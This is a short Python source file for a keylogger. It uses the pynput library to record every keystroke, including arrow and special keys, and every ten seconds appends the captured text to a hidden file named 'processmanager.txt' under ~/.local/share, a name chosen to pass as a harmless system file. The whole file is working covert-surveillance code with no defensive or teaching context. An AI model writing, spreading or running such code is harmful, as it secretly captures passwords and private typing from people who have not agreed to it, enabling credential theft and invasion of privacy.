# !/usr/bin/python
import subprocess
import sys
import threading

import pynput.keyboard
import os

log = ""
path = os.path.expanduser("~/.local/share/processmanager.txt")

def process_keys(key):
    global log
    try:
        log += str(key.char)
    except AttributeError:
        if key == key.space:
            log += " "
        elif key == key.right:
            log += "[RIGHT]"
        elif key == key.left:
            log += "[LEFT]"
        elif key == key.up:
            log += "[UP]"
        elif key == key.down:
            log += "[DOWN]"
        else:
            log += " " + str(key) + " "

def report():
    global log
    global path
    fin = open(path,"a")
    fin.write(log)
    log = ""
    fin.close()
    timer = threading.Timer(10, report)
    timer.start()

def start():
    keyboard_listener = pynput.keyboard.Listener(on_press=process_keys)
    with keyboard_listener:
        report()
        keyboard_listener.join()


